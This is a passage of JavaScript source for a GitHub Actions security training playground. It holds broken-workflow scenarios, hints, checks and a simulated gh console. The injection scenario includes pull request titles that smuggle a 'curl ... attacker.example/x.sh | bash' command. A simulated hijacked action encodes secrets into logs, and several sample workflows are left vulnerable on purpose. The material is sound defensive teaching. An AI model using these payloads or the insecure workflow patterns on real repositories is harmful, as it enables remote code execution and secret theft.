          on:
            workflow_call:
              inputs:
                target:
                  type: string
                  required: true
          jobs:
            ship:
              runs-on: ubuntu-latest
              steps:
                - uses: ${checkout}
                - run: ./deploy.sh \${{ inputs.target }}
                  env:
                    DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
        `
      },
      world: { secrets: deployToken },
      events: ["push"], verify: ["push"],
      checks: [["Production is deployed", (v) => deployedTo(v.run(0), "production")]],
      hints: [
        "Inputs are passed with `with:`. How are secrets passed to a called workflow?",
        "A called workflow sees only the secrets its caller passes: `secrets: inherit`, or named ones that the callee declares under `workflow_call.secrets`.",
        "Add `secrets: inherit` to the deploy job in ci.yml."
      ],
      lesson: "Reusable workflows receive no secrets unless the caller passes them, with inherit or by name."
    },
    {
      id: "local-action", group: "Reuse", level: "09", title: "Can't find 'action.yml'",
      story: "The setup steps were moved into a local composite action. The first job to use it fails.",
      goal: "Run the local action and the tests.",
      files: {
        [CI]: y`
          name: CI
          on: push
          jobs:
            test:
              runs-on: ubuntu-latest
              steps:
                - uses: ./.github/actions/setup
                - uses: ${checkout}
                - run: npm test
        `,
        ".github/actions/setup/action.yml": y`
          name: Set up the shop
          description: Install Node.js and the dependencies
          runs:
            using: composite
            steps:
              - uses: actions/setup-node@v6
                with:
                  node-version: 24
              - run: npm ci
                shell: bash
        `
      },
      events: ["push"], verify: ["push"],
      checks: [["The local action runs and the tests pass", (v) => ok(v.run(0)) && /Set up the shop|setup/.test(text(v.run(0))) && stepRan(v.run(0), /npm test/)]],
      hints: [
        "Read the error's last sentence.",
        "A local action is a file in the repository, so the repository must be checked out before the step that uses it.",
        "Move `- uses: actions/checkout@v6` above `- uses: ./.github/actions/setup`."
      ],
      lesson: "uses: ./path reads from the workspace. Check out first."
    },
    {
      id: "composite-shell", group: "Reuse", level: "09", title: "Required property is missing: shell",
      story: "A teammate added a step to the shared setup action. Every workflow that uses it now fails.",
      goal: "Fix the action so the tests run.",
      files: {
        [CI]: y`
          name: CI
          on: push
          jobs:
            test:
              runs-on: ubuntu-latest
              steps:
                - uses: ${checkout}
                - uses: ./.github/actions/setup
                - run: npm test
        `,
        ".github/actions/setup/action.yml": y`
          name: Set up the shop
          description: Install Node.js and the dependencies
          runs:
            using: composite
            steps:
              - uses: actions/setup-node@v6
                with:
                  node-version: 24
              - run: npm ci
                shell: bash
              - run: npm run lint
        `
      },
      events: ["push"], verify: ["push"],
      checks: [["The action runs lint and the tests pass", (v) => ok(v.run(0)) && /eslint/.test(text(v.run(0))) && stepRan(v.run(0), /npm test/)]],
      hints: [
        "The error points at a line in action.yml, not in the workflow.",
        "In a composite action every run step must say which shell to use; there is no default.",
        "Add `shell: bash` to the `npm run lint` step in action.yml."
      ],
      lesson: "Composite actions have no default shell. Each run step needs shell: bash (or pwsh, python)."
    },

    // --- Security ------------------------------------------------------------------------------
    {
      id: "injection", group: "Security", level: "11", title: "Script injection through a pull request title",
      story: "A title check runs on every pull request with a write token. A security researcher says any title can run code.",
      goal: "Check the title without letting it run as code.",
      files: { [CI]: y`
        name: Title check
        on:
          pull_request_target:
            types: [opened, edited]
        permissions:
          pull-requests: write
        jobs:
          title:
            runs-on: ubuntu-latest
            steps:
              - name: Check the title
                run: |
                  echo "Checking: \${{ github.event.pull_request.title }}"
                  echo "\${{ github.event.pull_request.title }}" | grep -qE '^(feat|fix|docs|chore):'
      ` },
      world: { remote: { "https://attacker.example/x.sh": "echo collected\n" } },
      events: ["prt-fork"],
      verify: [
        { id: "prt-fork", event: { title: "fix: typo in the cart" } },
        { id: "prt-fork", event: { title: "fix: $(curl -sSfL https://attacker.example/x.sh | bash)" } },
        { id: "prt-fork", event: { title: "fix: x'; curl -sSfL https://attacker.example/x.sh | bash; echo '" } }
      ],
      checks: [
        ["A normal title passes the check", (v) => ok(v.run(0))],
        ["A title with $( ) runs nothing", (v) => !v.run(1).effects.remote.length],
        ["A title with quotes runs nothing", (v) => !v.run(2).effects.remote.length]
      ],
      hints: [
        "Send the event, then read the expanded script in the log. The title is pasted into the script before bash runs it.",
        "${{ }} is replaced as text, so a title can close the quotes or add $( ). Pass untrusted values through an environment variable instead.",
        'Add `env:` with `TITLE: ${{ github.event.pull_request.title }}`, and use `"$TITLE"` in the script.'
      ],
      lesson: "Never put ${{ github.event.* }} inside run:. Put it in env: and quote the variable: bash treats a variable's value as data."
    },
    {
      id: "pwn-request", group: "Security", level: "11", title: "pull_request_target runs the fork's code",
      story: "To get coverage on fork pull requests, someone switched CI to pull_request_target and checked out the PR. A fork's package.json can now run code with your secrets.",
      goal: "Test fork pull requests safely, and keep coverage on pushes to main.",
      files: { [CI]: y`
        name: CI
        on:
          push:
            branches: [main]
          pull_request_target:
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
                with:
                  ref: \${{ github.event.pull_request.head.sha }}
              - run: npm ci
              - run: npm test
              - name: Upload coverage
                run: ./scripts/upload-coverage.sh
                env:
                  COVERAGE_TOKEN: \${{ secrets.COVERAGE_TOKEN }}
      ` },
      world: { secrets: { COVERAGE_TOKEN: "cov-5d0a71e2b9" }, forkFiles: { "package.json": '{\n  "name": "shop",\n  "scripts": { "test": "jest", "postinstall": "node scripts/telemetry.js" }\n}\n' } },
      events: ["prt-fork", "fork", "push"], verify: ["prt-fork", "fork", "push"],
      checks: [
        ["No fork code runs with secrets or a write token", (v) => !v.run(0).effects.pwned && !v.run(1).effects.pwned],
        ["A fork pull request tests its own code and passes", (v) => v.run(1).event.name === "pull_request" && ok(v.run(1)) && stepRan(v.run(1), /npm test/)],
        ["A push to main uploads coverage", (v) => /report uploaded/.test(text(v.run(2)))]
      ],
      hints: [
        "pull_request_target runs with secrets because it is meant for trusted code. What does `ref:` check out?",
        "Use `pull_request` for testing untrusted code: no secrets, a read-only token. Skip the upload where there are no secrets.",
        "Change the trigger to `pull_request:`, remove the `with: ref:` lines, and add `if: github.event_name == 'push'` to Upload coverage."
      ],
      lesson: "pull_request_target plus a checkout of the PR head runs untrusted code with your secrets: the pwn request. Test forks with pull_request."
    },
    {
      id: "unpinned", group: "Security", level: "11", title: "A third-party action's tag was moved",
      story: "acme/changed-files@v45 was hijacked last night: its tags now point at a commit that prints secrets into the logs.",
      goal: "Run the known-good release, pinned so a tag move cannot change it.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          changes:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - uses: acme/changed-files@v45
              - run: ./deploy.sh staging
                env:
                  DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
      ` },
      world: {
        secrets: deployToken,
        actions: { "acme/changed-files": { refs: {
          v45: { sha: "0e58ed8671d6b60d0890c21b07f8835ace038e67", run: hijacked },
          "v45.0.7": { sha: "0e58ed8671d6b60d0890c21b07f8835ace038e67", run: hijacked },
          "v45.0.6": { sha: "0e58ed8671d6b60d0890c21b07f8835ace038e67", run: hijacked },
          "48d8f15b2aaa3d255ca5af3eba4870f807ce6b3c": { sha: "48d8f15b2aaa3d255ca5af3eba4870f807ce6b3c", run: () => ({ lines: ["changed_files: src/cart.js"], secs: 2 }) }
        } } }
      },
      events: ["push"], verify: ["push"],
      checks: [
        ["No secret leaks into the logs", (v) => !v.run(0).effects.leaks.length],
        ["The action is pinned to a full commit SHA", (v) => /acme\/changed-files@[0-9a-f]{40}\b/.test(v.files[CI])],
        ["The run passes", (v) => ok(v.run(0))]
      ],
      hints: [
        "Open the changed-files step and look at the strings it prints.",
        "Tags can be moved to any commit, even v45.0.6. A full commit SHA cannot. The last good release, v45.0.6, was commit 48d8f15b2aaa3d255ca5af3eba4870f807ce6b3c.",
        "Use `acme/changed-files@48d8f15b2aaa3d255ca5af3eba4870f807ce6b3c # v45.0.6`."
      ],
      lesson: "Pin third-party actions to a full commit SHA, with the version in a comment; Dependabot updates both. This is how the real tj-actions/changed-files compromise of March 2025 leaked secrets."
    },
    {
      id: "secret-leak", group: "Security", level: "06", title: "A secret leaks past the log mask",
      story: "Someone debugging the deploy printed the token base64-encoded. The log shows it, and anyone can decode it.",
      goal: "Deploy with no secret visible in the logs.",
      files: { [CI]: y`
        name: Deploy
        on:
          push:
            branches: [main]
        jobs:
          deploy:
            runs-on: ubuntu-latest
            env:
              DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
            steps:
              - uses: ${checkout}
              - name: Debug the token
                run: echo "$DEPLOY_TOKEN" | base64
              - run: ./deploy.sh production
      ` },
      world: { secrets: deployToken },
      events: ["push"], verify: ["push"],
      checks: [["No secret is printed in any form", (v) => !v.run(0).effects.leaks.length], ["Production is deployed", (v) => deployedTo(v.run(0), "production")]],
      hints: [
        "GitHub masks a secret's exact value in logs. What about a value made from it?",
        "Masking matches the literal string only. Encoded, split or reversed, a secret is printed in full. ::add-mask:: does not help once it is printed.",
        "Delete the Debug the token step. If you rotate one thing today, rotate that token."
      ],
      lesson: "Never print a secret, even transformed. If one was printed, delete the logs and rotate the secret."
    },
    {
      id: "oidc-trust", group: "Security", level: "10", title: "OIDC trust policy allows any repository",
      story: "The deploy role trusts repo:nimbus/*. Any repository in the organisation, any branch, any pull request can assume production.",
      goal: "Let only this repository's production environment assume the role.",
      files: {
        [CI]: y`
          name: Deploy
          on:
            push:
              branches: [main]
          permissions:
            contents: read
            id-token: write
          jobs:
            deploy:
              runs-on: ubuntu-latest
              environment: production
              steps:
                - uses: ${checkout}
                - run: npm ci && npm run build
                - uses: aws-actions/configure-aws-credentials@v6
                  with:
                    role-to-assume: arn:aws:iam::123456789012:role/shop-deploy
                    aws-region: eu-west-1
                - run: aws s3 sync dist s3://shop-site
        `,
        "aws/shop-deploy-trust.json": JSON.stringify({ Version: "2012-10-17", Statement: [{ Effect: "Allow", Principal: { Federated: "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
          Action: "sts:AssumeRoleWithWebIdentity", Condition: { StringEquals: { "token.actions.githubusercontent.com:aud": "sts.amazonaws.com" }, StringLike: { "token.actions.githubusercontent.com:sub": "repo:nimbus/*" } } }] }, null, 2) + "\n"
      },
      world: { trustFile: "aws/shop-deploy-trust.json", environments: { production: { branches: ["main"] } }, roles: { "arn:aws:iam::123456789012:role/shop-deploy": {} } },
      events: ["push"], verify: ["push"],
      checks: [
        ["Production still deploys", (v) => deployedTo(v.run(0), "production")],
        ["Another repository is refused", (v) => !trustAllows(v.files["aws/shop-deploy-trust.json"], "repo:nimbus/sandbox:ref:refs/heads/main", "sts.amazonaws.com")],
        ["A feature branch is refused", (v) => !trustAllows(v.files["aws/shop-deploy-trust.json"], "repo:nimbus/shop:ref:refs/heads/feature/login", "sts.amazonaws.com")],
        ["A pull request is refused", (v) => !trustAllows(v.files["aws/shop-deploy-trust.json"], "repo:nimbus/shop:pull_request", "sts.amazonaws.com")]
      ],
      hints: [
        "Open the trust policy. What does repo:nimbus/* match?",
        "The sub claim names the repository and the ref, environment or pull_request. This job's is repo:nimbus/shop:environment:production.",
        'Replace the StringLike block with `"StringEquals": { "token.actions.githubusercontent.com:aud": "sts.amazonaws.com", "token.actions.githubusercontent.com:sub": "repo:nimbus/shop:environment:production" }`.'
      ],
      lesson: "Trust the narrowest sub claim: one repository and one environment. Wildcards in the sub are how one repository's workflow assumes another's role."
    },
    {
      id: "self-hosted", group: "Security", level: "11", title: "Fork pull requests run on your self-hosted runner",
      story: "This public repository runs CI on a self-hosted machine in the office network. Any fork pull request can run code on it.",
      goal: "Run pull request tests on GitHub-hosted runners; keep the self-hosted runner for deploys from main.",
      files: { [CI]: y`
        name: CI
        on:
          push:
            branches: [main]
          pull_request:
        jobs:
          test:
            runs-on: [self-hosted, linux]
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm test
          deploy:
            needs: test
            if: github.event_name == 'push'
            runs-on: [self-hosted, linux]
            steps:
              - uses: ${checkout}
              - run: ./deploy.sh production
                env:
                  DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
      ` },
      world: { secrets: deployToken, runners: { selfHosted: ["linux"] } },
      events: ["fork", "push"], verify: ["fork", "push"],
      checks: [
        ["A fork pull request passes without touching the self-hosted runner", (v) => ok(v.run(0)) && !v.run(0).effects.selfHosted],
        ["A push to main still deploys", (v) => deployedTo(v.run(1), "production")]
      ],
      hints: [
        "Which runner does the test job use for a fork pull request?",
        "Self-hosted runners keep state between jobs and sit in your network. On a public repository, anyone's pull request can run on them.",
        "Change the test job to `runs-on: ubuntu-latest`. Keep deploy on the self-hosted runner: it runs only on pushes."
      ],
      lesson: "Do not use self-hosted runners for untrusted code. On public repositories, keep them to jobs that only trusted events start."
    }
  ];

  // A hijacked release: dumps the runner's memory, double-encoded, into the log.
  function hijacked(sx) {
    const names = Object.keys(sx.secrets).filter((k) => k !== "GITHUB_TOKEN");
    sx.effects.leaks.push(...names);
    const blob = Object.values(sx.secrets).join("|");
    const enc = typeof btoa === "function" ? btoa(btoa(blob)) : Buffer.from(Buffer.from(blob).toString("base64")).toString("base64");
    return { lines: ["changed_files: src/cart.js", enc], secs: 3 };
  }

  const GROUPS = [...new Set(SCENARIOS.map((s) => s.group))].map((g) => [g, SCENARIOS.filter((s) => s.group === g).map((s) => s.id)]);

  // Each scenario's world: the base, with its changes merged in.
  function worldOf(s, extra) {
    const w = baseWorld();
    const add = s.world || {};
    Object.assign(w, add, { repo: { ...w.repo, ...(add.repo || {}), files: { ...w.repo.files, ...((add.repo || {}).files || {}) } }, events: { ...(add.events || {}) } });
    return extra ? extra(w) : w;
  }

  // Run every event the checks need, in order, sharing caches like real runs do.
  function verify(s, files, world) {
    const w = world || worldOf(s);
    const store = newStore();
    const runs = s.verify.map((e) => {
      const spec = typeof e === "string" ? { id: e } : e;
      const wv = spec.event ? { ...w, events: { ...w.events, [spec.id]: { ...(w.events[spec.id] || {}), ...spec.event } } } : w;
      return trigger(wv, files, spec.id, { store, inputs: spec.inputs, approve: true });
    });
    return { runs, files, world: w, run: (i) => runs[i][0] };
  }

  // [label, passed] for each check; a check that throws has not passed.
  function status(s, v) {
    return s.checks.map(([label, fn]) => { let pass = false; try { pass = !!fn(v); } catch { pass = false; } return [label, pass]; });
  }
  for (const s of SCENARIOS) s.won = (v) => status(s, v).every(([, p]) => p);

  // --- the gh console: a few gh commands against this session's runs and settings ---
  // session: { files, world, store, runs }. Returns { lines, run } where run asks the page
  // to send an event ({ id, inputs }). Commands it does not model point to a real repository.
  const LAB = "(not available in the playground: run it against a real repository)";
  function gh(session, line) {
    let words;
    try { words = root.AQEngine.shellTokens(line.trim()).filter((t) => typeof t !== "string").map((w) => w.map((p) => p[0]).join("")); } catch { return { lines: [["gh: could not parse that line; check its quotes", "err"]] }; }
    if (words[0] !== "gh") return { lines: [["This console runs gh commands. Try: gh run list", "dim"]] };
    const [, a, b, ...rest] = words;
    const flag = (name) => { const i = rest.indexOf(name); return i >= 0 ? rest[i + 1] : null; };
    const out = (...t) => ({ lines: t.map((x) => (Array.isArray(x) ? x : [x, ""])) });
    const w = session.world;
    const file = Object.keys(session.files).find((f) => /^\.github\/workflows\//.test(f));
    const short = (f) => f.split("/").pop();
    const runs = session.runs;
    const find = (id) => runs.find((r) => String(r.id) === String(id)) || (id == null ? runs[runs.length - 1] : null);
    const row = (cols, widths) => cols.map((c, i) => String(c).padEnd(widths[i])).join("  ").trimEnd();
    if (a === "run" && b === "list") {
      if (!runs.length) return out(["no runs found", "dim"]);
      const wd = [10, 26, 10, 16, 18, 11, 7];
      return out([row(["STATUS", "TITLE", "WORKFLOW", "BRANCH", "EVENT", "ID", "ELAPSED"], wd), "head"],
        ...runs.slice().reverse().map((r) => [row([r.conclusion || (r.status === "not-triggered" ? "skipped" : r.status), (r.title || r.reason || "").slice(0, 26), (r.name || short(file)).slice(0, 10),
          r.event.branch || r.event.tag || r.event.head || "", r.event.name, r.id, root.AQEngine.fmtSecs(r.duration || 0)], wd), "row"]));
    }
    if (a === "run" && b === "view") {
      const r = find(rest.find((x) => /^\d+$/.test(x)));
      if (!r) return out(["could not find any workflow run with ID " + (rest[0] || ""), "err"]);
      if (rest.includes("--log-failed")) {
        const failed = r.jobs.flatMap((j) => j.steps.filter((st) => st.conclusion === "failure").flatMap((st) => st.lines.map((l) => [`${j.name}\t${st.name}\t2026-10-30T09:14:07.0000000Z ${l[0]}`, ""])));
        return out(...(failed.length ? failed : [["no failed steps in this run", "dim"]]));
      }
      const mark = (c) => (c === "success" ? "✓" : c === "failure" ? "X" : c === "skipped" ? "-" : "*");
      return out(`${mark(r.conclusion)} ${r.event.branch || r.event.head || r.event.tag || ""} ${r.name || short(file)} · ${r.id}`, `Triggered via ${r.event.name}`, "", "JOBS",
        ...r.jobs.map((j) => `${mark(j.conclusion)} ${j.name} in ${root.AQEngine.fmtSecs((j.end - j.start) || 0)} (ID ${j.key})`),
        ...(r.annotations.length ? ["", "ANNOTATIONS", ...r.annotations.map((x) => `${x[0] === "error" ? "X" : "!"} ${x[1]}`)] : []));
    }
    if (a === "run" && b === "rerun") {
      const r = find(rest.find((x) => /^\d+$/.test(x)));
      if (!r) return out(["could not find any workflow run with ID " + (rest[0] || ""), "err"]);
      return { lines: [[`✓ Requested rerun of run ${r.id}`, "ok"]], run: { id: r.event.id, inputs: r.event.inputs } };
    }
    if (a === "workflow" && b === "list") return out([row(["NAME", "STATE", "ID"], [14, 8, 9]), "head"], [row([short(file), "active", "161803398"], [14, 8, 9]), "row"]);
    if (a === "workflow" && b === "run") {
      const target = rest.find((x) => !x.startsWith("-") && rest[rest.indexOf(x) - 1] !== "-f" && rest[rest.indexOf(x) - 1] !== "--ref");
      const p = root.AQYaml.parse(session.files[file] || "");
      const on = p.value && p.value.on;
      const has = on && (on === "workflow_dispatch" || (Array.isArray(on) && on.includes("workflow_dispatch")) || (typeof on === "object" && "workflow_dispatch" in on));
      if (target && short(file) !== target && file !== target) return out([`could not find any workflows named ${target}`, "err"]);
      if (!has) return out([`could not create workflow dispatch event: HTTP 422: Workflow does not have 'workflow_dispatch' trigger (https://api.github.com/repos/${root.AQEngine.FULL}/actions/workflows/${short(file)}/dispatches)`, "err"]);
      const inputs = {};
      rest.forEach((x, i) => { if ((x === "-f" || x === "-F" || x === "--field" || x === "--raw-field") && rest[i + 1]) { const [k, ...v] = rest[i + 1].split("="); inputs[k] = v.join("="); } });
      return { lines: [[`✓ Created workflow_dispatch event for ${short(file)} at ${flag("--ref") || "main"}`, "ok"], ["", ""], [`To see runs for this workflow, try: gh run list --workflow=${short(file)}`, "dim"]], run: { id: "dispatch", inputs } };
    }
    if ((a === "secret" || a === "variable") && (b === "list" || b === "set" || b === "delete")) {
      const app = flag("--app") || flag("-a");
      const env = flag("--env") || flag("-e");
      const store = a === "variable" ? (w.vars = w.vars || {})
        : app === "dependabot" ? (w.dependabotSecrets = w.dependabotSecrets || {})
          : env ? ((w.environments[env] = w.environments[env] || {}).secrets = w.environments[env].secrets || {}) : (w.secrets = w.secrets || {});
      const kind = a === "variable" ? "variable" : app === "dependabot" ? "Dependabot secret" : "Actions secret";
      if (b === "list") {
        const names = Object.keys(store);
        return names.length ? out([row(["NAME", "UPDATED"], [20, 12]), "head"], ...names.map((n) => [row([n, "about 1 day ago"], [20, 12]), "row"])) : out([`no ${a === "variable" ? "variables" : "secrets"} found`, "dim"]);
      }
      const name = rest.find((x, i) => !x.startsWith("-") && !["--app", "-a", "--env", "-e", "--body", "-b"].includes(rest[i - 1]));
      if (!name) return out([`gh ${a} ${b}: a name is required`, "err"]);
      if (b === "delete") { delete store[name]; return out([`✓ Deleted ${kind} ${name} from ${root.AQEngine.FULL}`, "ok"]); }
      store[name] = flag("--body") || flag("-b") || "set-from-console";
      return out([`✓ Set ${kind} ${name} for ${root.AQEngine.FULL}`, "ok"]);
    }
    if (a === "cache" && b === "list") {
      const keys = Object.keys(session.store.cache);
      if (!keys.length) return out(["No caches found in " + root.AQEngine.FULL, "dim"]);
      return out([row(["ID", "KEY", "SIZE"], [6, 70, 8]), "head"], ...keys.map((k, i) => [row([i + 1, k, "81.4 MiB"], [6, 70, 8]), "row"]));
    }
    if (a === "cache" && b === "delete") {
      if (rest.includes("--all")) { const n = Object.keys(session.store.cache).length; session.store.cache = {}; return out([`✓ Deleted ${n} caches from ${root.AQEngine.FULL}`, "ok"]); }
      const k = rest[0];
      if (!k || !(k in session.store.cache)) return out([`X Could not find a cache matching ${k || ""} in ${root.AQEngine.FULL}`, "err"]);
      delete session.store.cache[k];
      return out([`✓ Deleted 1 cache from ${root.AQEngine.FULL}`, "ok"]);
    }
    if (a === "api" && b === "rate_limit") return out(JSON.stringify({ resources: { core: { limit: 1000, used: 12, remaining: 988 } } }, null, 2));
    if (a === "api" && rest.includes("--paginate")) {
      const total = (w.app && w.app.prCount) || 40;
      const per = Number((/per_page=(\d+)/.exec(b || "") || [])[1]) || 30;
      return out(`(${total} items in ${Math.ceil(total / Math.min(100, per))} requests)`);
    }
    if (a === "api" && /actions\/permissions\/workflow$/.test(b || "")) return out(JSON.stringify({ default_workflow_permissions: w.repo.permissive ? "write" : "read", can_approve_pull_request_reviews: false }, null, 2));
    if (["run", "workflow", "secret", "variable", "cache", "attestation", "pr", "release", "api", "auth", "repo", "ruleset", "extension"].includes(a)) return out([LAB, "dim"]);
    return out([`unknown command "${a || ""}" for "gh"`, "err"]);
  }

  root.AQScenarios = { SCENARIOS, GROUPS, verify, status, worldOf, CI, gh, LAB };
})(typeof window !== "undefined" ? window : globalThis);
